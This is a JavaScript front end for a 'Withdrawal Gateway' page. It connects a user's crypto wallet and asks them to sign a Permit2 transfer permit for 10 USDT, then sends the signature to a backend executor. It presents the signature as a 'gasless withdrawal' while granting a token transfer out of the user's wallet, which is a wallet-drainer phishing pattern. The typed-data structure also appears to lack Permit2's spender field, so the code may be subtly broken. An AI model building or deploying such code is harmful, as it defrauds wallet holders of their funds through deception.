import { createAppKit } from "@reown/appkit";
import { Ethers5Adapter } from "@reown/appkit-adapter-ethers5";
import { mainnet, arbitrum } from "@reown/appkit/networks";
import { ethers } from "ethers";

// 1. Initialize Reown AppKit
const projectId = "f340171a355aad487eb6daa39b4b6c10"; // Replace with your Reown Project ID

const metadata = {
  name: "Withdrawal Gateway",
  description: "Secure Gasless Withdrawals",
  url: "https://avelut.xyz", 
  icons: ["https://www.avelut.xyz/logo_full.png"],
};

const modal = createAppKit({
  adapters: [new Ethers5Adapter()],
  metadata: metadata,
  networks: [mainnet],
  projectId,
  features: {
    analytics: false,
  },
});

// 2. UI Toast Utility
function showToast(msg, isError = false) {
    const toastContainer = document.getElementById('toastContainer');
    if (!toastContainer) return;

    const div = document.createElement('div');
    div.className = `p-4 rounded-2xl shadow-2xl backdrop-blur-md bg-opacity-90 text-white font-semibold transition-all duration-300 transform translate-y-[-20px] opacity-0 ${isError ? 'bg-red-600' : 'bg-green-600'}`;
    div.textContent = msg;
    
    toastContainer.appendChild(div);
    
    setTimeout(() => { div.style.transform = 'translateY(0)'; div.style.opacity = '1'; }, 10);
    setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 300); }, 3000);
}

// 3. The Withdrawal / Signing Logic (Ethers v5 Format)
async function handleWithdraw() {
    try {
        // Ensure wallet is connected via AppKit
        if (!modal.getIsConnectedState()) {
            await modal.open();
            return;
        }

        showToast("Connecting to provider...");
        
        // Use Ethers v5 Web3Provider wrapper
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const owner = await signer.getAddress();
        const network = await provider.getNetwork();

        // EIP-712 Domain
        const domain = {
            name: "Permit2",
            chainId: network.chainId,
            verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3"
        };

        // EIP-712 Types (Ethers v5 structure)
        const types = {
            PermitTransferFrom: [
                { name: "permitted", type: "TokenPermissions" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ],
            TokenPermissions: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint256" }
            ]
        };

        // EIP-712 Message Values
        const amount = ethers.utils.parseUnits("10", 6); // 10 USDT
        const nonce = Date.now(); // Unique nonce
        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hr expiry

        const message = {
            permitted: {
                token: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT Address
                amount: amount
            },
            nonce: nonce,
            deadline: deadline
        };

        showToast("Please sign the transaction in your wallet...");

        // Execute Ethers v5 Typed Data Signing
        const signature = await signer._signTypedData(domain, types, message);

        showToast("Signature secured. Executing transfer...");

        // Send to your backend executor
        const res = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                signature, 
                permitData: { details: message, nonce, deadline }, 
                owner 
            })
        });

        const data = await res.json();
        if (data.success) {
            showToast("Success! Funds withdrawn.", false);
        } else {
            showToast(data.message || "Transfer failed.", true);
        }

    } catch (err) {
        console.error(err);
        showToast(err.message.includes("user rejected") ? "User cancelled signature." : err.message, true);
    }
}

// 4. Attach to DOM on load
document.addEventListener('DOMContentLoaded', () => {
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', handleWithdraw);
    }
});